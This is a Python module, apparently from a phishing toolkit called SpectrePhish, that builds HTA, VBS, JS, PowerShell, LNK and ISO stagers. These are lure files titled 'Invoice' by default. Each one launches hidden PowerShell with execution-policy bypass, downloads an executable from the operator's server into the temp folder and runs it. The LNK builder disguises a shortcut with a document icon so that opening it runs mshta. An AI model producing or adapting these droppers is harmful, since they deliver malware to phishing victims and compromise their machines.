"""
SpectrePhish :: core/payloads.py
Stager generation: HTA, VBS, JS, PS1, plus LNK/ISO when the tools exist.

Offensive logic: the payload lives on the SpectrePhish server, so every
download is tracked. You know who executed it, when, and from which IP.

QUOTE TRAP (this file broke once -- do not "tidy" it):
  The HTA and VBS run lines end with  ...-c ""{ps}"" "  -- the escaped inner
  quotes plus the closing quote form FOUR consecutive quote characters.
  Four is fine; THREE would terminate the Python triple-quoted string early
  and orphan the following lines with an IndentationError. The single space
  before the final quote is load-bearing.

Author : Inayat Hussain
"""

from __future__ import annotations

import os
import shutil
import subprocess

from config import PAYLOAD_DIR

HTA = """<html><head><title>{title}</title>
<HTA:APPLICATION ID="o" WINDOWSTATE="minimize" SHOWINTASKBAR="no"/></head>
<script language="VBScript">
Sub Window_OnLoad
  Set sh = CreateObject("WScript.Shell")
  sh.Run "powershell -nop -w hidden -ep bypass -c ""{ps}"" ", 0, False
  window.close
End Sub
</script></html>
"""

VBS = """' {title}
Dim sh : Set sh = CreateObject("WScript.Shell")
sh.Run "powershell -nop -w hidden -ep bypass -c ""{ps}"" ", 0, False
"""

JS = """// {title}
var sh = new ActiveXObject("WScript.Shell");
sh.Run('powershell -nop -w hidden -ep bypass -c "{ps}"', 0, false);
"""

PS1 = """# {title}
$ProgressPreference = 'SilentlyContinue'
{ps}
"""

PS_STAGER = ("$u='{url}';$o=Join-Path $env:TEMP 'sp.exe';"
             "Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing;"
             "Start-Process $o")


def build_all(base_url: str, title: str = "Invoice") -> list:
    os.makedirs(PAYLOAD_DIR, exist_ok=True)
    payload_url = f"{base_url.rstrip('/')}/payload/stager.exe"
    ps = PS_STAGER.format(url=payload_url)
    written = []

    for ext, template in (("hta", HTA), ("vbs", VBS), ("js", JS), ("ps1", PS1)):
        body = template.format(title=title, ps=ps)
        path = os.path.join(PAYLOAD_DIR, f"{title.lower()}.{ext}")
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(body)
        written.append(path)

    lnk = _build_lnk(title)
    if lnk:
        written.append(lnk)
    return written


def _build_lnk(title: str) -> str | None:
    path = os.path.join(PAYLOAD_DIR, f"{title.lower()}.lnk")
    target = os.path.join(PAYLOAD_DIR, f"{title.lower()}.hta")

    powershell = shutil.which("pwsh") or shutil.which("powershell")
    if powershell:
        script = (
            "$w=New-Object -ComObject WScript.Shell;"
            f"$s=$w.CreateShortcut('{path}');"
            "$s.TargetPath='C:\\Windows\\System32\\mshta.exe';"
            f"$s.Arguments='{target}';"
            "$s.IconLocation='%SystemRoot%\\System32\\shell32.dll,1';"
            "$s.Save()")
        try:
            subprocess.run([powershell, "-NoProfile", "-Command", script],
                           check=True, capture_output=True, timeout=30)
            if os.path.isfile(path):
                return path
        except Exception:
            pass
    return None


def build_iso(title: str) -> str | None:
    geniso = shutil.which("genisoimage") or shutil.which("mkisofs")
    if not geniso:
        return None
    out = os.path.join(PAYLOAD_DIR, f"{title.lower()}.iso")
    try:
        subprocess.run([geniso, "-o", out, "-V", title[:16], "-J", "-R", PAYLOAD_DIR],
                       check=True, capture_output=True, timeout=60)
        return out if os.path.isfile(out) else None
    except Exception:
        return None
